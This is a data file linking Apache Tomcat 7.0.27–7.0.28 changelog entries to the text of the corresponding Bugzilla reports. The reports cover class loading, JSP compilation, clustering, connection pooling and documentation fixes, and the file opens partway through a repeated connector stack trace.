        at org.apache.coyote.http11.Http11NioProcessor.event(Http11NioProcessor.java:124)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:569)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1653)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:730)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:1008)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.add(NioEndpoint.java:999)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.longPoll(Http11NioProtocol.java:277)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:596)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53406
Coyote|Tomcat 7.0.28 (markt)|fix||Improve InternalNioInputBuffer.parseHeaders(). (kkolinko)|||
Coyote|Tomcat 7.0.28 (markt)|add||Implement maxHeaderCount attribute on Connector. It is equivalent of LimitRequestFields directive of Apache HTTPD. Default value is 100. (kkolinko)|||http://httpd.apache.org/
Jasper|Tomcat 7.0.28 (markt)|fix||48097#c7, 53366#c1: If JSP page unexpectedly fails to initialize PageContext instance, write exception to the logs instead of silent swallowing. (kkolinko)|NoClassDefFoundError on first access of first jsp|"Created attachment 24452 [details]
simple webapp with one jsp and one class in one jar, reproducing the error

I've had a strange situation getting NoClassDefFoundErrors on a particular jsp
page (which happened to be the index.jsp page). The class it claimed to not
find is a simple session bean class within a jar in the WEB-INF/lib folder. The
strange thing is that it gave this error only when this page was the first one
accessed after a tomcat restart. If any page was accessed before it, it would
work properly. But if this page was accessed first, then no matter what pages
were later accessed, the error remained in place. So the error/success state
was determined by whichever page was accessed first ater the tomcat restart,
and remained in the same error/success state for as long as tomcat was up,
regardless of anything happening later on (until the next restart)

This seems to be some sort of class-loading oder-of-initialization bug, but is
entirely consistent when the pages are accessed in this order after a tomcat
restart. It drove me nuts for a while, since the main application page was
showing an error after every restart, but I eventually stumbled on a strange
workaround: changing the order or a couple of lines in the jsp, involving the
useBean directive and access to java's URI class. with the order changed, the
error never happens. with the order returned, the error is reproduced as
described above.

I've managed to distill a simple scenario which reproduces this error - a short
jsp and a trivial bean session class - attached. I reproduced this on a fresh
installation of Kubuntu 9.10 in a virtual machine, with sun jre 6 and tomcat6
installed. I didn't change any configuration, just replaced the ROOT sample
webapp with this one, restarted tomcat, and browsed to
http://localhost:8080/index.jsp. Remember u have to restart tomcat after every
change to the jsp if u want to recreate the bug, because simply changing it and
refreshing the browser will always succeed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48097#c7
Jasper|Tomcat 7.0.28 (markt)|fix|53032|Modify JspC so it extends org.apache.tools.ant.Task enabling it to work with features such as namespaces within build.xml files. (markt)|Ant Jasper task fails to run when using XML namespaces; no output; no errors|"One way to use bulk task definitions in Ant is to use XML namespaces:


<project name=""teamcity""
         xmlns:tomcat6=""http://tomcat.apache.org/ant/tomcat/6"">

...


    <path id=""tomcat.6.ant.classpath"">
        <fileset dir=""${my.path.library.build}/tomcat-6.0.35"">
            <include name=""*.jar"" />
        </fileset>
        <path refid=""my.path.compile.jsp"" />
    </path>

    <typedef resource=""org/apache/catalina/ant/antlib.xml""
             uri=""http://tomcat.apache.org/ant/tomcat/6""
             classpathref=""tomcat.6.ant.classpath"" />

...

    <target>
        <tomcat6:list ... />
        <tomcat6:deploy ... />
    </target>

...
</project>

This works great for list, deploy, etc. In fact, it works great for every other Ant task as far as I can tell. But it doesn't work for the jasper/jasper2 tasks (which both point to the same class).

<tomcat6:jasper ... />

This does nothing. And by ‚Äúnothing‚Äù I mean that I use `ant -verbose` when running Ant, verbose=‚Äù1‚Äù within the Jasper task, and there‚Äôs no output from the Jasper task, not a single line of output/logging, and the build completes in 0 seconds with no compiled JSPs output.

However, if I define the Jasper task explicitly, using the exact same paths (as you can clearly see):
 
    <taskdef classname=""org.apache.jasper.JspC"" name=""tomcat6-jsp-compile"">
        <classpath>
            <path refid=""tomcat.6.ant.classpath"" />
        </classpath>
    </taskdef>
 
And call the Jasper task using the exact same options:
 
<tomcat6-jsp-compile ... />
 
Everything works. It compiles 2,487 JSPs in 275s, and outputs exactly what I expect, including 2,487 compiled JSPs and two logging messages. From what I understand about Ant, there should be absolutely no difference, and yet there apparently is, because they behave differently.

The jasper task should support namespaces like the other Tomcat Ant tasks, and like other Ant tasks in general.

(Note: I have confirmed at http://ant.apache.org/faq.html that a separate classloader IS used for the taskdef, and that Jspc will not have access to conflicting classes loaded by other namespaces.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53032
Cluster|Tomcat 7.0.28 (markt)|fix||Avoid NPE when reload if a state of a BackupManager is FAILED. (kfujino)|||
Cluster|Tomcat 7.0.28 (markt)|fix|53087|In order to avoid that a backup node expire a session, replicate session access time in BackupManager. (kfujino)|BackupManager does not replicate session access time.|"Created attachment 28619 [details]
BackupManager does not replicate session access time.

BackupManager does not replicate session access time.
If a primary session does not change an attribute but it is only access ,
non-primary session(backup node) expire session.

I made a patch to replicate session access time.

Best Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53087
Cluster|Tomcat 7.0.28 (markt)|add||Add support for SecureRandom to cluster manager template. (kfujino)|||
Web applications|Tomcat 7.0.28 (markt)|fix||Remove obsolete bug warning from Windows service documentation page. (rjung)|||
Web applications|Tomcat 7.0.28 (markt)|add|50182|Various improvements to the Compression Filter. Patch provided by David Becker. (markt)|Contributing back enhancements to CompressionFilter|"Created attachment 26227 [details]
Source code and example web.xml

Years ago I contributed an enhancement to convert the SSIServlet into a filter (java/org/apache/catalina/ssi/SSIFilter.java).  Now I'm back to offer up some enhancements to the CompressionFilter example (webapps/examples/WEB-INF/classes/compressionFilters).

I've found (as have others) that the connector compression is flaky and unreliable, so I turned to the CompressionFilter example, but found it to be badly lacking in functionality.  No doubt owing to its status as an example project.  I've made a bunch of enhancements to it and I feel it's worth of being moved out of examples now.  You may even want to deprecate the connector compression in favor of this - or at least roll the two together.  In my own webapp (and the attached zip) I've renamed it to GZipFilter and it lives in my own internal package structure, but please move it back into an org.apache package structure and rename it as you see fit.

The enhancements I've made are:
* It now supports specifying which mime types are compressible.
* It now supports a variable sized buffer, which can be used to avoid chunking on small files.
* The compression threshold and all other settings are configurable in web.xml.
* Miscellaneous bug fixes.

If you adopt these enhancements, please credit David Becker with no email, same as on the SSIServlet.

Enjoy!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50182
Web applications|Tomcat 7.0.28 (markt)|fix|52853|Clarify how Jar Scanner handles directories. (markt)|@HandlesTypes not resolving classes when added as repository directory|"I am running an embedded container that loads the web application classes and external JARS using the method WebappLoader#addRepository(java.lang.String). One of the external JARs is spring-web with version 3.1. That JAR file provides the class SpringServletContainerInitializer annotated with @HandlesTypes to load implementations of WebApplicationInitializer for web apps that don't provide a web.xml.

In my application I provide an implementation of WebApplicationInitializer. This is found if I add my compiled class files as JAR file using WebappLoader#addRepository(java.lang.String) - the web application gets configured correctly. However, adding the classes directory instead will not resolve the class. This sounds like some kind of class loading issue to me.

As a side-note the web application is loaded just fine when you provide a web.xml (Servlet compatibility < 3.0). All classes can be resolved and used. You can have a look at the source code here: https://github.com/bmuschko/gradle-tomcat-plugin/blob/master/plugin/src/main/groovy/org/gradle/api/plugins/tomcat/TomcatRun.groovy#L70"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52853
Web applications|Tomcat 7.0.28 (markt)|fix|53158|Fix documented defaults for DBCP 1.x. Patch provided by ph.dezanneau at gmail.com. (rjung)|Wrong default values indicated for the evictor service|"http://tomcat.apache.org/tomcat-6.0-doc/jndi-resources-howto.html 

In this Tomcat 6.x documentation page, it is stated that :

timeBetweenEvictionRunsMillis - The number of milliseconds between consecutive runs of the evictor. Default: 30*60*1000 (30 minutes)
minEvictableIdleTimeMillis - The idle time in milliseconds after which a connection can be removed from the pool by the evictor. Default: -1 (disabled)

The default values for those parameters are actually the other way around :

timeBetweenEvictionRunsMillis - The number of milliseconds between consecutive runs of the evictor. Default: -1 (disabled)
minEvictableIdleTimeMillis - The idle time in milliseconds after which a connection can be removed from the pool by the evictor. Default: 30*60*1000 (30 minutes)

You can see this on the GenericObjectPool class from commons-pool :

http://grepcode.com/file/repo1.maven.org/maven2/commons-pool/commons-pool/1.3/org/apache/commons/pool/impl/GenericObjectPool.java#GenericObjectPool

Thank you."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53158
Web applications|Tomcat 7.0.28 (markt)|fix|53203|Correct documentation for the default value of connectionTimeout attribute for AJP protocol connectors. (kkolinko)|Incorrect document of ajp connectionTimeout.|"Created attachment 28739 [details]
patch file

The default value of AJP's connectionTimeout in the doc differs from the source code's.

Although the doc says ""60000 ms"", the source code says ""-1"".(i.e. no timeout).

I made the patch that corrects ""60000 ms"" to ""no timeout"" in the doc."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53203
Web applications|Tomcat 7.0.28 (markt)|update|53289|Clarify ResourceLink example that uses DataSource.getConnection(username, password) method. Not all data source implementations support it. (kkolinko)|Clarify ResourceLink example that uses getConnection(username, password)|"It was reported on the users list:
http://marc.info/?t=133780532900005&r=1&w=2
http://markmail.org/thread/26yhdl7pfhdm2dic


In documentation there is example [1] on using a ResourceLink with specific value for the factory, org.apache.naming.factory.DataSourceLinkFactory. It allows to specify custom username and password while reusing connections from  a global datasource pool. This feature was added per bug 49543.


The problem is that there is an important bit that is lacking from the description: this feature requires support from the pool implementation for getConnection(username, password) method.

- In Apache Commons DBCP pool there is no support for that method [2]. An UnsupportedOperationException will be thrown. (DBCP 1.4)

- In Apache Tomcat JDBC pool support for this feature is off by default (username and password are ignored). It can be enabled by setting alternateUsernameAllowed=""true"". [3]


[1] http://tomcat.apache.org/tomcat-7.0-doc/config/context.html#Resource_Links

[2] http://commons.apache.org/dbcp/apidocs/org/apache/commons/dbcp/BasicDataSource.html#getConnection%28java.lang.String,%20java.lang.String%29

[3] http://tomcat.apache.org/tomcat-7.0-doc/jdbc-pool.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53289
Web applications|Tomcat 7.0.28 (markt)|fix||Fix several HTML markup errors in servlets of examples web application. (kkolinko)|||
Web applications|Tomcat 7.0.28 (markt)|fix|53398|"Correct spelling of ""received"" in the Manager application's XML output. (markt)"|Incorrect tag on XML response when calling 'manager/status?XML=true'|"Created attachment 28909 [details]
Manager Status XML Response

When calling 'manager/status?XML=true' on Tomcat Server the XML response includes incorrect 'requestBytesRecieved' attributes on some '<worker>' nodes.

Attribute should read 'requestBytesReceived'.  Seems like a typo when generating the 'requestBytesReceived' attribute for some nodes (Recieved != Received).

Error can be generated using the CURL command to get the Tomcat status response:

curl ""http://<tomcat-server-address>/manager/status?XML=true"" --basic -u <user>

(This assumes a user has already been defined with the proper privileges to access the status API command)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53398
Web applications|Tomcat 7.0.28 (markt)|fix|53403|Update a reference to the Servlet specification in the first web application section of the documentation web application to include newer versions of the specification. (markt)|Reference to 2.2/2.3 servlet container in Tomcat 7 docs|"http://tomcat.apache.org/tomcat-7.0-doc/appdev/deployment.html

""When you install an application into Tomcat (or any other 2.2/2.3-compatible server)""

shoud read something like

""When you install an application into Tomcat (or any other 2.2/2.3/3.0-compatible server)"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=53403
jdbc-pool|Tomcat 7.0.28 (markt)|fix||50864 (r1311844): JMX enable most pool properties (fhanik)|Reconfigure pool on the fly using JMX|"Provide a way to reconfigure the jdbc-pool using JMX and have it take effect when changes are submitted.
http://markmail.org/message/x6wem3zkxl4ps7ki"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50864
jdbc-pool|Tomcat 7.0.28 (markt)|add||53254 (r1340160): Add in the ability to purge connections from the pool (fhanik)|Support for purging connection pool|"It is a common function of a connection pool to support ""purging"" the pool of all current connections and getting all fresh connections.  Oracle UCP and Websphere pools are two such examples.  It would be great if this pool supported such an operation as well.

It would be useful if the operation were exposed through JMX too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53254
jdbc-pool|Tomcat 7.0.28 (markt)|update||53367 (r1346691): Prevent pool from hanging during database failure (fhanik)|Database failure may cause pool to hang|"during the 
 con.connect(); 
call in the method 

protected PooledConnection borrowConnection(long now, PooledConnection con, String username, String password) in ConnectionPool.java

There is no counting down the size of the pool. This means, if a connection failure happens here, the pool size remains the same. This means that 'size' will show the pool as full, but in reality the pool is empty"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53367
jdbc-pool|Tomcat 7.0.28 (markt)|update||When a connection is reconnected due to failed validation make sure the ConnectionState is reset or it will assume incorrect values (fhanik)|||
jdbc-pool|Tomcat 7.0.28 (markt)|fix||53374 (r1348056): Add support for the following properties in DataSourceFactory: commitOnReturn, rollbackOnReturn, useDisposableConnectionFacade, logValidationErrors and propagateInterruptState. Based on patch proposed by Suresh Avadhanula. (kkolinko)|DataSourceFactory does not support commitOnReturn property|"DataSourceFactory does not support commitOnReturn property.
DataSourceFactory.ALL_PROPERTIES and DataSourceFactory.parsePoolProperties() omit commitOnReturn property."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53374
Other|Tomcat 7.0.28 (markt)|update||Update to Eclipse JDT Compiler 3.7.2 at maven tomcat-jasper.pom. (pero)|||
Other|Tomcat 7.0.28 (markt)|update||Update the native component of the Tomcat APR/native connector to 1.1.24. (markt)|||
Other|Tomcat 7.0.28 (markt)|fix||Add missing dependencies in pom files. (markt)|||
Other|Tomcat 7.0.28 (markt)|add|53034|Add project.url and project.licenses sections to the POMs for the Maven artifacts. (markt)|apache tomcat deployed pom does not contain url or license|"Even though Apache Tomcat doesn't manage itself with Apache Maven, it is really great that the project deploys artifacts for user consumption.

Unfortunately, these artifacts are missing some important pieces of information that are really important for working in big organizations: there is no project.url defined, and there is no project.licenses section. Adding both of these would play nicely in automated systems which need to have that license available to produce a proper ""Bill of Materials""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53034
Other|Tomcat 7.0.28 (markt)|fix||Properly mention jsp_2_2.xsd in the main LICENSE and INSTALLLICENSE files. (kkolinko)|||
Other|Tomcat 7.0.28 (markt)|fix|53115|"Fix using the command ""catalina.bat run"" when the value of %TEMP% contains spaces. (kkolinko)"|catalina.bat run does not work if TEMP contains spaces|"Under clean Windows XP, under Administrator account. 
Default temp dir is like c:\Documents and Settings\Admin\Local Settings\TEMP

In catalina.bat there is a temp dir check:
if """"%TEMP%"""" == """""""" goto mainEntry

Actually, this command does not work if TEMP contains spaces. 
The right line is:
if """"%TEMP%"""" == """""""" goto mainEntry

i.e. to avoid double quoting"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53115
Other|Tomcat 7.0.28 (markt)|update||"Add dependencies and description to ""validate"" target in build.xml, so that it could be run separately. Improve BUILDING.txt and RUNNING.txt. (kkolinko)"|||
Catalina|Tomcat 7.0.27 (markt)|update||Explicitly ignore empty path values in virtualClasspath attribute of VirtualWebappLoader class. Document that whitespace around the values is trimmed. Reformat documentation examples to make them more readable. (kkolinko)|||
Catalina|Tomcat 7.0.27 (markt)|fix||Further improve fix for 51197 to allow an error reporting Valve to write a response body if sendError() is called during an asynchronous request on a container thread. (markt)|sendError/sendRedirect don't work with AsyncContext|"For some reason, response.sendRedirect and response.sendError are not producing expected behavior when using an AsyncContext.  On the server side, the async request completes normally, and everything looks hunky dory, but the client never gets ANY response from the server.  It appears that Tomcat simply times out after the default 10 seconds and closes the connection.  No headers are returned, no content, nothing.  I've confirmed with thread dumps that the server isn't stuck.

Yet...if you use response.setStatus and response.setHeader instead, it works absolutely fine.  The client gets the response every time.

I put together a very simple test that isolates the issue reliably:

https://github.com/dcheckoway/async-test

See the README in there for details.

NOTE: the behavior for sendError changed slightly from 7.0.12 to 7.0.14.  As of 7.0.14, sendError seems to close the connection immediately, but the client still never gets any response of any kind."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51197
Catalina|Tomcat 7.0.27 (markt)|fix||Correct fix for 51741 (r1307600): If VirtualDirContext class is configured with non-empty value of extraResourcePaths option (a feature added in 7.0.24), do not implicitly set allowLinking option to the value of true. If it is really needed, it should be set explicitly. (kkolinko)|"Eclipse WTP ""Serve modules without publishing"" broken with tc7, needs patch in tomcat"|"Eclipse WTP has an option ""Serve modules without publishing"" that works well with tc6, but not with tc7.
After investigation by the WTP team, there seem to be no way for them to fix this without modifying tomcat. The problem in WTP is reported here : https://bugs.eclipse.org/bugs/show_bug.cgi?id=333102

Basically, their DirContext implementation (org.eclipse.jst.server.tomcat.loader.WtpDirContext) returns a ResourceAttributes that correctly points to an existing location, but org.apache.catalina.loader.WebappClassLoader.findResourceInternal(String, String) ignores it and returns a ResourceEntry whose codeBase and source fields point to a non-existing location.
This breaks applications that call getResource(...) on the Thread ContextClassLoader and use the returned URL.
A call to getResourceAsStream(...) on the Thread CCL is OK."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51741
Catalina|Tomcat 7.0.27 (markt)|add|52500|Added configurable mechanism to retrieve user names from X509 client certificates. Based on a patch provided by Michael Furman. (schultz)|Improve client certificate authentication||https://bz.apache.org/bugzilla/show_bug.cgi?id=52500
Catalina|Tomcat 7.0.27 (markt)|fix|52719|Fix a theoretical resource leak in the JAR validation that checks for non-permitted classes in web application JARs. (markt)|An incomplete fix for the resource leak bug in WebappClassLoader.java|"The fix revision 423920 was aimed to remove an resource leak bug on the  JarFile ""jarFile ""  in the method ""validateJarFile"" of the file ""/tomcat/tc6.0.x/trunk/java/org/apache/catalina/loader/WebappClassLoader.java"" , but it is incomplete. 

When the statements at lines 3226-3245 throw any eception, the object ""jarFile "" can not be closed as expected. The best way to close such resource object is putting such close operations in the finaly block of a try-catch-finally structure.

The buggy code is copies as bellows: 


3220 protected boolean validateJarFile(File jarfile)
        throws IOException {

        if (triggers == null)
            return (true);
3225        JarFile jarFile = new JarFile(jarfile);
3226        for (int i = 0; i < triggers.length; i++) {
            Class clazz = null;
            try {
                if (parent != null) {
                    clazz = parent.loadClass(triggers[i]);
                } else {
                    clazz = Class.forName(triggers[i]);
                }
            } catch (Throwable t) {
                clazz = null;
            }
            if (clazz == null)
                continue;
            String name = triggers[i].replace('.', '/') + "".class"";
            if (log.isDebugEnabled())
                log.debug("" Checking for "" + name);
            JarEntry jarEntry = jarFile.getJarEntry(name);
            if (jarEntry != null) {
                log.info(""validateJarFile("" + jarfile + 
                    "") - jar not loaded. See Servlet Spec 2.3, ""
                    + ""section 9.7.2. Offending class: "" + name);
3246                jarFile.close();
                return (false);
            }
        }
        jarFile.close();
        return (true);

    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52719
Catalina|Tomcat 7.0.27 (markt)|code||Code clean-up identified by 52723, 52724, 52726, 52727, 52729, 52731 and 52732. (markt)|An incomplete fix for the resource leak bugs in StandardManager.java|"The fix revision 907502 was aimed to remove an resource leak bug on the 
FileOutputStream object ""fos"" and the ObjectOutputStream ""oos"" in the method 
""doUnload"" of the file 
""/tomcat/tc6.0.x/trunk/java/org/apache/catalina/session/StandardManager.java"" , 
but it is incomplete. 

When the ObjectOutputStream object is created unsuccessfully but the temp 
BufferedOutputStream object is created successfully, the temp object will be 
leaked. 

Besides that, the ""oos"" is not closed in all the pathes.  The best way to close 
such resource object is putting such close operations in the finaly block of a 
try-catch-finally structure."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52723
Catalina|Tomcat 7.0.27 (markt)|fix|52792|Improve error message when a JNDI resource can not be found. (markt)|Incomplete error message when lookup a resource that is not bound in the naming|"Created attachment 28401 [details]
Patch proposal

Hi,

I have a servlet that specifies @Resource on a field level. (see attached sample application)
When a request comes for this servlet, Tomcat tries to inject this resource and to instantiate the servlet. If the resource is not found, 500 ISE is returned as a response code. In the error message returned in the error page, it is not specified the full composite name that Tomcat tries to lookup, but only the first part (the context) (see incorrect.png). Thus the end user cannot understand which is the resource that causes the problem, but only the context that cannot be found.

I would like to propose a patch (attached). A screenshot (correct.png) with corrected error message is also attached.

Thanks in advance.
Regards,
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52792
Catalina|Tomcat 7.0.27 (markt)|fix|52811|Fix parsing of Content-Type header in HttpServletResponse.setContentType(). Introduces a new HTTP header parser that follows RFC2616. (markt/kkolinko)|HttpServletResponse.setContentType() parses the content type incorrectly|"When creating the HttpServletResponse the setContentType(type) is used for setting the content type and character encoding.
If the type is for example:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

it is parsed and the content type is set to:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil

and character encoding to:

UTF-8

I believe it is incorrect, the content type should be:

multipart/related;boundary=1_4F50BD36_CDF8C28;Start=""<31671603.smil>"";Type=""application/smil;charset=UTF-8""

and the character encoding should be set to default (ISO-8859-1)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52811
Catalina|Tomcat 7.0.27 (markt)|fix|52830|Correct JNDI lookups when using javax.naming.Name to identify the resource rather than a java.lang.String. (markt)|DataSource JNDI lookup with javax.naming.Name failed|"I try to use tomcat 7 with hibernate 4.x I got an Naming exception on getting dataSource with javax.naming.Name.

Works when search with string. But hibernate migrate to Name in their code.

See:
https://hibernate.onjira.com/browse/HHH-7012"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52830
Catalina|Tomcat 7.0.27 (markt)|fix|52833|Handle the case where the parent class loader for the Catalina object does not have the system class loader in its hierarchy. This may happen when embedding. Patch provided by olamy. (markt)|NPE with 7.0.26|"Upgrading the maven plugin 7.0.26, the goal which runs tomcat with a conf dir (not the embed version) generate the following NPE 
Log:
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:141)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:645)
	at org.apache.tomcat.maven.plugin.tomcat7.run.AbstractRunMojo.startContainer(AbstractRunMojo.java:679)
	at org.apache.tomcat.maven.plugin.tomcat7.run.AbstractRunMojo.execute(AbstractRunMojo.java:365)
